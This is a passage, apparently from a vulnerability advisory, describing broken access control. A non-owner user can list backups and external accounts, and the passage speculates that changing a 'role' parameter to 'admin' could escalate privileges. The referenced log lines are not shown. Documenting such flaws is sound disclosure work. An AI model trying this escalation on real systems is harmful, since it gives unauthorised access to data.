      In `L1-5` we see that an admin user `hugo` has owner permissions and can list backups and external accounts.
      In `L8-9` we see that the normal user `marlies` does not have owner permissions.
      However, in `L10-12` we see that `marlies` is still able to list backups and external accounts.
      Although not explicitly exploited here, it might even be possible to simply change the `role` parameter to `admin` for any user.
